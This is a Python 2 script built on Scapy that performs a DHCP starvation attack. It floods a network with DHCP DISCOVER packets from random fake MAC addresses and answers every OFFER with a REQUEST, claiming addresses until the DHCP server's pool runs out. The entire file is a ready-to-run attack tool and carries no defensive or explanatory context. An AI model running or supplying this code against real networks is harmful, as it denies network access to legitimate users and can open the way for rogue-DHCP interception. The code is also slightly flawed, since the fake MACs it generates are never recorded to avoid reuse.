import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
from scapy.all import *
from time import sleep
from threading import Thread

fam,hw = get_if_raw_hwaddr("eth0")

class DHCPStarvation(object):
	def __init__(self):
		# Generated MAC stored to avoid same MAC requesting for different IP
		self.mac = [""]

		# Requested IP stored to identify registered IP
		self.ip = []

	def handle_dhcp(self, pkt):
		if pkt[DHCP]:
			#print pkt[IP].dst
			if pkt[DHCP].options[0][1]==5:
				#print ("ACK received")
				#self.ip.append(pkt[BOOTP].yiaddr)
				print "-" * 20
				print str(pkt[BOOTP].yiaddr)+" Obtained"
				
			elif pkt[DHCP].options[0][1]==6:
				print ("NAK received")
			elif pkt[DHCP].options[0][1]==2:
                                print "-" * 20
                                print "DHCP Server offered you " + pkt[BOOTP].yiaddr
				#print "MAC ADDRESS IS ", pkt[BOOTP].chaddr
				#print "Server ID is: ",pkt[DHCP].options[1][1]
				self.pket(pkt[BOOTP].chaddr,'request',pkt[BOOTP].yiaddr,pkt[DHCP].options[1][1])




	def listen(self):
		# sniff DHCP packets
		sniff(filter="udp and (port 67 or port 68)",
			  prn=self.handle_dhcp,
			  store=0), #stop_filter=self.stop)
		print "TIMEOUT"

	def start(self):
		# start packet listening thread
		thread = Thread(target=self.listen)
		thread.start()
		print ("Starting DHCP starvation...")
		self.starve()

		#while len(self.ip) <= 1: self.starve()
		print ("Targeted IP address starved")

	

	def pket(self, mac, req_type ='discover', ip ="0.0.0.0", sip = '0.0.0.0'):
		ethernet=Ether(dst='ff:ff:ff:ff:ff:ff',src=hw) 
		if req_type == 'discover':
			fake_mac = ""
			while fake_mac in self.mac:
				fake_mac = RandMAC()._fix()
			#print "Generated Fake HW-ADD is " + str(fake_mac)
			mac = fake_mac
			dhcp= DHCP(options=[("message-type",req_type),"end"])
		elif req_type == 'request':
			dhcp= DHCP(options=[("message-type", req_type),
					    ("requested_addr", ip),
					    ("server_id", sip),
					    "end"])
		ip =IP(src='0.0.0.0',dst='255.255.255.255')
		udp =UDP(sport=68,dport=67)
		#bootp=BOOTP(chaddr=hw, ciaddr='0.0.0.0',xid= 0x01020304,flags=1)
		bootp = BOOTP(chaddr=mac, xid= 0x005CA997,flags=1)
		#dhcp=DHCP(options=[("message-type","request"),("requested_addr", i[1][BOOTP].yiaddr),"end"])
		packet= ethernet / ip / udp / bootp / dhcp
		sendp(packet, verbose=False) #sends packet

	def starve(self):
		while(True):
		   self.pket(hw)
		   sleep(0.2)  # interval to avoid congestion and packet loss
	   

if __name__ == "__main__":
	print "Scapy Version: ",conf.version
	starvation = DHCPStarvation()
	starvation.start()
